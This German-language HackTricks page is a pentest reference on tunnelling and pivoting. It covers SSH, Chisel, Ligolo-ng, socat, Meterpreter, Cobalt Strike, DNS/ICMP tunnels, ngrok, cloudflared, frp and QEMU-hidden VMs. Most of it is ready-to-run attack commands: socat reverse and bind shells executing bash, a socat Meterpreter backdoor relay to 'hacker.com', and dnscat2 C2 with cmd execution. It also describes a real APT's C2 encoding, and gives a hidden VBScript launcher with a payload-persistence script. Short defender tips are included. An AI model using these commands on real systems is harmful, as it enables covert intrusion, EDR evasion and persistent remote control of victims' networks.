# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap Tipp

> [!WARNING]
> **ICMP** und **SYN** scans können nicht durch socks proxies getunnelt werden, daher müssen wir **disable ping discovery** (`-Pn`) und **TCP scans** (`-sT`) angeben, damit das funktioniert.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafische Verbindung (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Öffne neuen Port im SSH Server --> anderen Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokaler Port --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokaler Port --> Kompromittierter Host (SSH) --> Wohin auch immer
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Das ist nützlich, um reverse shells von internen Hosts durch eine DMZ zu deinem Host zu erhalten:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Du brauchst **root auf beiden Geräten** (da du neue Interfaces erstellen wirst) und die sshd config muss root login erlauben:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Weiterleitung auf dem Server aktivieren
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Setze eine neue Route auf der Client-Seite
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Sicherheit – Terrapin Attack (CVE-2023-48795)**
> Der Terrapin-Downgrade-Angriff von 2023 kann einem man-in-the-middle erlauben, den frühen SSH-Handshake zu manipulieren und Daten in **jeden weitergeleiteten Kanal** (`-L`, `-R`, `-D`) einzuschleusen. Stellen Sie sicher, dass sowohl Client als auch Server gepatcht sind (**OpenSSH ≥ 9.6/LibreSSH 6.7**) oder deaktivieren Sie explizit die verwundbaren `chacha20-poly1305@openssh.com` und `*-etm@openssh.com` Algorithmen in `sshd_config`/`ssh_config`, bevor Sie sich auf SSH-Tunnel verlassen.

## SSHUTTLE

Du kannst über **ssh** den gesamten **Traffic** zu einem **Subnetz** durch einen Host **tunneln**.\
Zum Beispiel: Weiterleitung des gesamten Verkehrs, der an 10.10.10.0/24 gerichtet ist
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Mit einem Private Key verbinden
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokaler Port --> Kompromittierter Host (aktive Sitzung) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Eine andere Möglichkeit:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Öffne einen Port im teamserver, der auf allen Schnittstellen lauscht und dazu verwendet werden kann, **den Datenverkehr durch den beacon zu routen**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In diesem Fall wird der **port is opened in the beacon host**, nicht im Team Server und der traffic wird an den Team Server gesendet und von dort an den angegebenen host:port.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Zu beachten:

- Beacon's reverse port forward ist darauf ausgelegt, **Traffic zum Team Server zu tunneln, nicht um zwischen einzelnen Maschinen weiterzuleiten**.
- Traffic wird **innerhalb von Beacon's C2 traffic getunnelt**, einschließlich P2P links.
- **Admin privileges sind nicht erforderlich**, um reverse port forwards auf high ports zu erstellen.

### rPort2Port local

> [!WARNING]
> In diesem Fall wird der **port im beacon host geöffnet**, nicht im Team Server, und **Traffic wird an den Cobalt Strike client gesendet** (nicht an den Team Server) und von dort an den angegebenen host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Du musst eine Web-Datei als Tunnel hochladen: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Du kannst es von der Releases-Seite von [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen\
Du musst die **gleiche Version für Client und Server** verwenden

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Portweiterleitung
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Verwende dieselbe Version für agent und proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent-Bindung und Lauschen
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Zugriff auf die lokalen Ports des Agenten
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Der Tunnel wird vom Opfer gestartet.\
Ein socks4 proxy wird auf 127.0.0.1:1080 erstellt.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot durch **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port durch socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter über SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Du kannst einen **non-authenticated proxy** umgehen, indem du diese Zeile statt der letzten in der Konsole des Opfers ausführst:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Erstelle Zertifikate auf beiden Seiten: Client und Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Verbinde den lokalen SSH-Port (22) mit dem Port 443 des Angreifer-Hosts
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es ist wie eine Konsolen-Version von PuTTY (die Optionen sind einem ssh client sehr ähnlich).

Da dieses binary auf dem victim ausgeführt wird und ein ssh client ist, müssen wir unseren ssh service und Port öffnen, damit wir eine reverse connection bekommen. Um dann nur einen lokal zugänglichen Port auf einen Port unserer Maschine weiterzuleiten:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Du musst local admin sein (für jeden Port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Du musst **RDP-Zugriff auf das System** haben.\
Herunterladen:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) der Remote Desktop Service-Funktion von Windows. DVC ist verantwortlich für **das Tunneln von Paketen über die RDP-Verbindung**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Auf deinem Client-Computer lade **`SocksOverRDP-Plugin.dll`** wie folgt:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Jetzt können wir uns über **RDP** mit dem **victim** mit **`mstsc.exe`** verbinden, und wir sollten eine **Meldung** erhalten, die besagt, dass das **SocksOverRDP-Plugin** aktiviert ist, und es wird auf **127.0.0.1:1080** lauschen.

**Verbinde** dich über **RDP** und lade auf der **victim-Maschine** die Binärdatei `SocksOverRDP-Server.exe` hoch und führe sie aus:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bestätige nun auf deinem Rechner (attacker), dass Port 1080 lauscht:
```
netstat -antb | findstr 1080
```
Jetzt können Sie [**Proxifier**](https://www.proxifier.com/) verwenden, um den Datenverkehr über diesen Port zu leiten.

## Proxify Windows GUI Apps

Sie können Windows-GUI-Apps dazu bringen, einen Proxy zu verwenden, indem Sie [**Proxifier**](https://www.proxifier.com/).\
In **Profile -> Proxy Servers** fügen Sie die IP und den Port des SOCKS-Servers hinzu.\
In **Profile -> Proxification Rules** fügen Sie den Namen des Programms hinzu, das proxifiziert werden soll, sowie die Verbindungen zu den IPs, die Sie proxifizieren möchten.

## NTLM proxy bypass

Das vorher erwähnte Tool: **Rpivot**\
**OpenVPN** kann es ebenfalls umgehen, indem man diese Optionen in der Konfigurationsdatei setzt:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Es authentifiziert sich gegenüber einem proxy und bindet einen lokalen port, der an den externen Dienst weitergeleitet wird, den du angibst. Dann kannst du das Tool deiner Wahl über diesen port nutzen.\
Zum Beispiel wird port 443 weitergeleitet.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\\
You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.

## YARP

Ein Reverse-Proxy von Microsoft. Du findest ihn hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root wird auf beiden Systemen benötigt, um tun adapters zu erstellen und mittels DNS-Abfragen Daten zwischen ihnen zu tunneln.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Der Tunnel wird sehr langsam sein. Du kannst eine komprimierte SSH-Verbindung durch diesen Tunnel erstellen, indem du Folgendes verwendest:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Stellt einen C\&C-Kanal über DNS her. Es benötigt keine root privileges.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Sie können [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) verwenden, um einen dnscat2-Client in PowerShell auszuführen:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding mit dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Proxychains DNS ändern

Proxychains fängt den `gethostbyname` libc-Aufruf ab und tunnelt TCP-DNS-Anfragen durch den socks-Proxy. Standardmäßig ist der **DNS**-Server, den proxychains verwendet, **4.2.2.2** (fest kodiert). Um das zu ändern, bearbeite die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändere die IP. Wenn du dich in einer **Windows environment** befindest, könntest du die IP des **domain controller** setzen.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Der Storm-2603-Akteur entwickelte einen **dual-channel C2 ("AK47C2")**, der *nur* ausgehenden **DNS**- und **plain HTTP POST**-Verkehr missbraucht – zwei Protokolle, die in Unternehmensnetzwerken selten blockiert werden.

1. **DNS mode (AK47DNS)**
• Generiert eine zufällige 5-stellige SessionID (z. B. `H4T14`).
• Fügt `1` für *task requests* oder `2` für *results* voran und verknüpft verschiedene Felder (flags, SessionID, computer name).
• Jedes Feld wird **XOR-encrypted mit dem ASCII-Key `VHBD@H`**, hex-kodiert und mit Punkten zusammengesetzt – endet schließlich mit der vom Angreifer kontrollierten Domain:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests verwenden `DnsQuery()` für **TXT** (und als Fallback **MG**) Records.
• Wenn die Antwort größer als 0xFF Bytes ist, fragmentiert der Backdoor die Daten in 63-Byte-Stücke und fügt die Marker ein:
`s<SessionID>t<TOTAL>p<POS>`, damit der C2-Server sie neu anordnen kann.

2. **HTTP mode (AK47HTTP)**
• Baut eine JSON-Hülle:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Der gesamte Blob wird mit XOR-`VHBD@H` → hex → als Body eines **`POST /`** mit Header `Content-Type: text/plain` gesendet.
• Die Antwort verwendet dieselbe Kodierung und das `cmd`-Feld wird mit `cmd.exe /c <command> 2>&1` ausgeführt.

Blue Team-Hinweise
• Suche nach ungewöhnlichen **TXT-Queries**, deren erstes Label lange Hexadezimalwerte ist und die immer in einer seltenen Domain enden.
• Ein konstanter XOR-Key gefolgt von ASCII-Hex ist mit YARA leicht zu erkennen: `6?56484244?484` (`VHBD@H` in hex).
• Bei HTTP: markiere text/plain POST-Bodies, die reines Hex und ein Vielfaches von zwei Bytes sind.

{{#note}}
Der gesamte Channel passt in **standard RFC-konforme Queries** und hält jedes Subdomain-Label unter 63 Bytes, wodurch er in den meisten DNS-Logs unauffällig bleibt.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Auf beiden Systemen wird Root benötigt, um tun adapters zu erstellen und Daten zwischen ihnen mithilfe von ICMP echo requests zu tunneln.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Lade es hier herunter**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **ist ein Tool, um Lösungen mit einem einzigen Kommandozeilenbefehl ins Internet zu exponieren.**\
_Exposition-URIs sehen etwa so aus:_ **UID.ngrok.io**

### Installation

- Account erstellen: https://ngrok.com/signup
- Client herunterladen:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Grundlegende Verwendung

**Dokumentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Es ist auch möglich, bei Bedarf Authentifizierung und TLS hinzuzufügen._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Dateien über HTTP bereitstellen
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP-Aufrufe

_Nützlich für XSS,SSRF,SSTI ..._\
Direkt aus stdout oder im HTTP-Interface [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internen HTTP-Service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml einfaches Konfigurationsbeispiel

Öffnet 3 Tunnel:

- 2 TCP
- 1 HTTP mit statischer Bereitstellung von Dateien aus /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Der `cloudflared`-Daemon von Cloudflare kann ausgehende Tunnels erstellen, die **lokale TCP/UDP-Services** exponieren, ohne eingehende Firewall-Regeln zu benötigen, und verwendet Cloudflares Edge als Treffpunkt. Das ist sehr praktisch, wenn die ausgehende Firewall nur HTTPS-Verkehr erlaubt, aber eingehende Verbindungen blockiert werden.

### Schneller Tunnel-Einzeiler
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Persistente Tunnel mit DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Starte den Connector:
```bash
cloudflared tunnel run mytunnel
```
Weil der gesamte Traffic den Host **outbound over 443** verlässt, sind Cloudflared-Tunnel eine einfache Möglichkeit, Ingress-ACLs oder NAT-Grenzen zu umgehen. Beachte, dass die binary normalerweise mit erhöhten Rechten läuft – verwende nach Möglichkeit containers oder die `--user` flag.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ist ein aktiv gepflegter Go reverse-proxy, der **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching** unterstützt. Ab **v0.53.0 (May 2024)** kann es als **SSH Tunnel Gateway** fungieren, sodass ein Zielhost einen reverse tunnel nur mit dem stock OpenSSH client aufbauen kann – kein extra binary erforderlich.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Verwendung des neuen SSH-Gateway (kein frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Der obige Befehl veröffentlicht den Port des Opfers **8080** als **attacker_ip:9000**, ohne zusätzliche Tools zu installieren – ideal für living-off-the-land pivoting.

## Verdeckte VM-basierte Tunnels mit QEMU

QEMU’s user-mode networking (`-netdev user`) unterstützt eine Option namens `hostfwd`, die **einen TCP/UDP-Port auf dem *host* bindet und in den *guest* weiterleitet***. Wenn der *guest* einen vollständigen SSH-Daemon ausführt, bietet die hostfwd-Regel eine temporäre SSH jump box, die vollständig innerhalb einer ephemeren VM lebt – perfekt, um C2-Traffic vor EDR zu verbergen, da alle bösartigen Aktivitäten und Dateien auf der virtuellen Festplatte bleiben.

### Kurzer One-Liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Der obige Befehl startet ein **Tiny Core Linux**-Image (`tc.qcow2`) im RAM.  
• Port **2222/tcp** auf dem Windows-Host wird transparent auf **22/tcp** im Gast weitergeleitet.  
• Aus Sicht des Angreifers exponiert das Ziel einfach Port 2222; alle Pakete, die es erreichen, werden vom SSH-Server verarbeitet, der in der VM läuft.

### Unauffälliges Starten mit VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Wenn das Skript mit `cscript.exe //B update.vbs` ausgeführt wird, bleibt das Fenster verborgen.

### Persistenz im Gast-OS

Da Tiny Core zustandslos ist, tun Angreifer normalerweise:

1. Drop payload to `/opt/123.out`
2. Append to `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Füge `home/tc` und `opt` zu `/opt/filetool.lst` hinzu, damit die payload beim Shutdown in `mydata.tgz` gepackt wird.

### Warum das der Erkennung entgeht

• Nur zwei unsignierte ausführbare Dateien (`qemu-system-*.exe`) greifen auf die Festplatte zu; es werden keine Treiber oder Dienste installiert.  
• Sicherheitsprodukte auf dem Host sehen **harmlosen Loopback-Traffic** (der eigentliche C2 endet innerhalb der VM).  
• Memory-Scanner analysieren niemals den bösartigen Prozessraum, weil er in einem anderen OS lebt.

### Tipps für Verteidiger

• Alarm auslösen bei **unerwarteten QEMU/VirtualBox/KVM-Binaries** in benutzerschreibbaren Pfaden.  
• Blockiere ausgehende Verbindungen, die von `qemu-system*.exe` ausgehen.  
• Suche nach seltenen listening-Ports (2222, 10022, …), die unmittelbar nach einem QEMU-Start gebunden werden.

---

## Weitere Tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Referenzen

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
